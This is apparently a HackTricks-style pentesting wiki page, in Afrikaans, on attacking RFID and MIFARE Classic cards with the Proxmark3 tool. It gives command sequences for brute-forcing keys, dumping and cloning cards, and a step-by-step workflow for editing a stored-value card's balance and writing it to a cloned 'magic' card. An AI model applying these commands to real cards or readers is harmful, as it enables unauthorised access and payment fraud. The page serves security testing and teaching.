# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Aanval op RFID-stelsels met Proxmark3

Installeer die aktief onderhoude RRG/Iceman Proxmark3-kliënt en ooreenstemmende firmware, en bevestig dan die opdragsintaksis vir daardie weergawe, aangesien ouer opdragte wat hieronder gewys word, moontlik verander het.<sup>[[1]](#references)[[5]](#references)</sup>

### Aanval op MIFARE Classic 1KB

MIFARE Classic 1K het **16 sektore**, elk met **4 blokke** van **16 grepe**. Vervaardigerblok 0 bevat die UID-/vervaardigerdata en is leesalleen op egte NXP-kaarte; spesiale kloon- of “magic”-kaarte kan moontlik herskryf word.<sup>[[1]](#references)[[2]](#references)</sup>\
Om toegang tot elke sektor te kry, benodig jy **2 sleutels** (**A** en **B**) wat in **blok 3 van elke sektor** (die sektorvoetstuk) gestoor word. Die sektorvoetstuk stoor ook die **toegangsbisse** wat die **lees- en skryftoestemmings** vir **elke blok** met behulp van die 2 sleutels bepaal.\
Die 2 sleutels is nuttig om byvoorbeeld leestoestemming te gee as jy die eerste sleutel ken, en skryftoestemming as jy die tweede sleutel ken.

Verskeie aanvalle kan uitgevoer word.

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Die Proxmark3 laat jou toe om ander handelinge uit te voer, soos om na **Tag to Reader communication** te **luister** om sensitiewe data te probeer vind. Met hierdie kaart kan jy net die kommunikasie afluister en die gebruikte sleutel bereken, omdat die **kriptografiese bewerkings wat gebruik word swak is** en jy dit kan bereken as jy die gewone en geënkripteerde teks ken (`mfkey64`-nutsding).<sup>[[3]](#references)</sup>

#### MiFare Classic: vinnige werkvloei vir misbruik van gestoorde waardes

Wanneer terminale saldo's op Classic-kaarte stoor, is 'n tipiese end-tot-end-werkvloei soos volg:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Notas

- `hf mf autopwn` orkestreer nested-/darkside-/HardNested-agtige aanvalle, herwin sleutels en skep dumps in die kliënt se dumps-lêergids.<sup>[[1]](#references)</sup>
- Die skryf van blok 0/UID werk slegs op magic gen1a/gen2-kaarte. Normale Classic-kaarte het ’n leesalleen-UID.<sup>[[2]](#references)</sup>
- Baie ontplooiings gebruik Classic-"waardeblokke" of eenvoudige kontrolesomme. Maak seker dat alle gedupliseerde/gekombineerde velde en kontrolesomme konsekwent is nadat dit gewysig is.<sup>[[4]](#references)</sup>

Sien ’n metodologie op hoër vlak en versagtingsmaatreëls by:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Rou opdragte

IoT-stelsels gebruik soms **ongemerkte of niekommersiële etikette**. In hierdie geval kan jy Proxmark3 gebruik om pasgemaakte **rou opdragte na die etikette te stuur**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Met hierdie inligting kan jy probeer om inligting oor die kaart en oor die manier waarop jy daarmee kan kommunikeer, te soek. Proxmark3 laat jou toe om rou opdragte te stuur, soos: `hf 14a raw -p -b 7 26`

### Skripte

Die Proxmark3-sagteware kom met ’n voorafgelaaide lys **outomatiseringskripte** wat jy kan gebruik om eenvoudige take uit te voer. Gebruik die opdrag `script list` om die volledige lys te kry. Gebruik daarna die opdrag `script run`, gevolg deur die skrip se naam:

```
proxmark3> script run mfkeys
```

Jy kan ’n script skep om **tag readers te fuzz**. Nadat jy die data van ’n **geldige kaart** gekopieer het, skryf jy bloot ’n **Lua script** wat een of meer ewekansige **bytes** verander en kyk of die **reader crash** tydens enige iterasie.

## References

- [1] [Proxmark3-wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3-wiki: HF Magic-kaarte](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP se verklaring oor MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Uitbuiting van NFC-kaartkwesbaarheid in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux-installasie](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
